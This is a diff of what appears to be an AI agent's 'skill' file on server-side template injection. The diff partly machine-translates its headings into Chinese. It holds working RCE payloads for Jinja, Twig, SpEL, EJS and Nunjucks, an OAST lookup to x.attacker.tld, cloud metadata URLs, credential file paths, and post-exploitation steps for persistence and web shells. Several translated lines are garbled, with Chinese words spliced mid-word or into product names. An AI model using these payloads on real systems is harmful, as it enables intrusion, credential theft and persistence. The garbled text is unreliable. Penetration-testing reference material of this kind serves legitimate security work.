@@ -1,13 +1,13 @@
 ---
 name: ssti
-description: Server-side template injection across Jinja / Mako / Velocity / Freemarker / Thymeleaf / Twig / Handlebars / EJS / ERB with engine fingerprinting, sandbox escape, and RCE gadget chains
+description: SSTI 安全测试技能
 ---
 
-# Server-Side Template Injection
+# SSTI / 服务端模板注入
 
 SSTI happens when user input reaches a template engine as syntax instead of as data — `{{user_input}}` rendered through Jinja, `${user_input}` through Velocity / SpEL, `<%= user_input %>` through ERB / EJS. The eventual impact is almost always RCE because template engines are designed to evaluate expressions and most leak access to the host language's runtime (Python builtins, Java reflection, JavaScript prototypes). The discovery cost is low — a `{{7*7}}` probe — but the gadget chain to RCE differs sharply per engine, so engine fingerprinting is the load-bearing step.
 
-## Attack Surface
+## 攻击面
 
 **Input shapes that reach the renderer**
 - Form fields, query / path / header values, cookies, JSON / GraphQL variables
@@ -41,7 +41,7 @@ SSTI happens when user input reaches a template engine as syntax instead of as d
 
 ## Reconnaissance
 
-### Injection Points
+### 注入点
 
 - Submit a benign string and grep responses (HTML, JSON, emails, PDFs) for verbatim reflection
 - Anywhere user input ends up in a value that's clearly being templated (preview panes, "your message will look like…" panels) is high-signal
@@ -72,7 +72,7 @@ When output isn't reflected:
 - **OAST**: payload that performs a DNS lookup or HTTP fetch to attacker infrastructure (`{{request.application.__globals__.__builtins__.__import__('socket').gethostbyname('x.attacker.tld')}}`)
 - **Length / ETag diff**: payload whose evaluation changes the body length, even if the value isn't directly visible
 
-## Key Vulnerabilities
+## 关键漏洞
 
 ### Jinja2 / Mako (Python)
 
@@ -137,7 +137,7 @@ Twig sandbox bypasses are version-specific. The canonical historical gadget (Twi
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
 ```
 
-This was patched — in Twig 2.x / 3.x `_self` returns the template name as a string and no longer exposes `.env`. Modern bypasses depend on which extensions are loaded and the active sandbox policy; consult Twig's published security advisories for the current state and probe with the version-specific gadgets (filter/function abuse, reflection on `_context` in some configs).
+This was patched — in Twig 2.x / 3.x `_self` returns the template name as a string and no longer exposes `.env`. 模式rn bypasses depend on which extensions are loaded and the active sandbox policy; consult Twig's published security advisories for the current state and probe with the version-specific gadgets (filter/function abuse, reflection on `_context` in some configs).
 
 Smarty `{php}...{/php}` was the historical RCE primitive; deprecated in Smarty 3 and removed in 4. On modern Smarty, the surface is static-method invocation and template-object reflection — `{$smarty.template_object->smarty->...}` walks back to the Smarty engine, and direct static calls on whitelisted classes (e.g. `{Smarty_Internal_Write_File::writeFile(...)}` on misconfigured installs) reach the filesystem. Probe both before assuming Smarty is hardened.
 
@@ -211,15 +211,15 @@ Handlebars itself is harder (default helpers are restricted), but custom helpers
 - Unsafe deserialization gadget invoked through template (Java `ObjectInputStream`, Python `pickle`, PHP `unserialize`)
 - DNS / HTTP exfiltration when shell exec produces no observable output
 
-## Post-Exploitation
+## 利用后
 
 - Environment dump (`env`, `os.environ`, `System.getenv`) — credentials, cloud metadata tokens, internal URLs
-- Cloud metadata fetch (`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`) — IAM tokens
+- 云端 metadata fetch (`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`) — IAM tokens
 - Read filesystem secrets (`.env`, `.aws/credentials`, `~/.ssh/`, `/proc/self/environ`)
 - Lateral via internal HTTP — service mesh endpoints reachable from the rendering host
 - Persistence: cron, scheduled task, systemd unit, `~/.ssh/authorized_keys`, web shell in webroot
 
-## Testing Methodology
+## 测试方法
 
 1. **Find templated input** — anywhere a server clearly templated user input (preview panes, email previews, dynamic dashboards, custom fields)
 2. **Fingerprint the engine** — run the differential probe table; confirm with a second probe
@@ -229,7 +229,7 @@ Handlebars itself is harder (default helpers are restricted), but custom helpers
 6. **Reach RCE** — pick the shortest gadget chain to a shell-equivalent primitive
 7. **Validate side effects** — DNS callback, file write, sleep — anything observable that proves execution
 
-## Validation
+## 验证
 
 1. Show evaluated output for two distinct expressions (`{{7*7}}` → `49` and `{{7*8}}` → `56`) to rule out coincidence or hard-coded reflection
 2. Demonstrate object access (`{{self.__class__}}`, `${T(java.lang.Class)}`) confirming runtime reflection
@@ -237,7 +237,7 @@ Handlebars itself is harder (default helpers are restricted), but custom helpers
 4. For RCE: command output captured in response, file written, or OAST callback containing command output
 5. Provide minimal payload — the simplest expression that reaches RCE, not the kitchen-sink polyglot
 
-## False Positives
+## 误报
 
 - Template syntax reflected literally (`{{7*7}}` rendered as `{{7*7}}`) — that's XSS-shaped, not SSTI
 - Sandboxed environments where reflection succeeds but reachable objects expose nothing useful (Jinja `SandboxedEnvironment` with no `request` / `config` in context)
@@ -245,26 +245,26 @@ Handlebars itself is harder (default helpers are restricted), but custom helpers
 - Markdown / static-site generators that template at build time only, with no user input reaching the build
 - Engines where the output is HTML-escaped before display, masking evaluation as XSS-like reflection — verify with a non-HTML probe (`{{7*7}}` numeric)
 
-## Impact
+## 影响
 
 - Remote code execution on the rendering host (the default outcome — almost every engine leaks a path to it)
 - Server-side data exfiltration via gadget chains (filesystem, env vars, internal HTTP)
-- Cloud credential theft via metadata service access from the compromised host
+- 云端 credential theft via metadata service access from the compromised host
 - Lateral movement into internal services reachable from the renderer
 - Persistent backdoor via web shell or service-account key planting
 - Build / supply-chain compromise when the templated content is a build artifact
 
-## Pro Tips
+## 实战技巧
 
 1. Always confirm with a second math probe (`{{7*8}}`) before celebrating — single-shot reflection of `49` could be coincidental
 2. Engine fingerprint first, gadget chain second — wrong-engine payloads are wasted requests and noise in WAF logs
 3. For Jinja, the highest-yield reachable global varies by framework (`request` in Flask, `config` always present, `cycler` in older Jinja); spray all three before walking subclasses
-4. SpEL is everywhere in Spring stacks — Thymeleaf, Spring Security expression language, Spring Cloud Gateway routes; the same payload shape (`${T(java.lang.Runtime)...}`) works across all of them
+4. SpEL is everywhere in Spring stacks — Thymeleaf, Spring Security expression language, Spring 云端 Gateway routes; the same payload shape (`${T(java.lang.Runtime)...}`) works across all of them
 5. EJS / Nunjucks are common in Express / Koa apps — `require('child_process').execSync('id')` if `require` is in scope (EJS), or escape via `range.constructor("return require('child_process')...")()` for Nunjucks; `process.mainModule.require(...)` is the older form, deprecated since Node 14
 6. Sandbox escapes are usually one indirection away — `attr` lookup, constructor traversal, MRO walk; most "sandboxed" environments still reach the runtime if you go through attribute access instead of direct reference
 7. Output not reflected? Time-based and OAST work as well as for SQLi — `${T(java.lang.Thread).sleep(5000)}` for SpEL, `{{cycler.__init__.__globals__.__import__('time').sleep(5)}}` (or the `request.application.__globals__.__builtins__` walk in Flask) for Jinja — bare `__import__` is not in the template namespace and will raise `UndefinedError`
 8. Email previews and PDF generators are gold mines — they're often built on the same engine as the public site but exposed to less-validated input flows
 
-## Summary
+## 总结
 
 SSTI is fundamentally different from XSS at the same syntactic location: the payload runs on the server, in the host language, with whatever objects the engine exposes. Engine fingerprinting via the math-probe table narrows the search space immediately. From there it's a race between the sandbox's denylist and the language's reflection capability — and the language usually wins. Treat any user input that reaches a template renderer (not a templated context variable) as RCE-shaped until proven sandboxed.
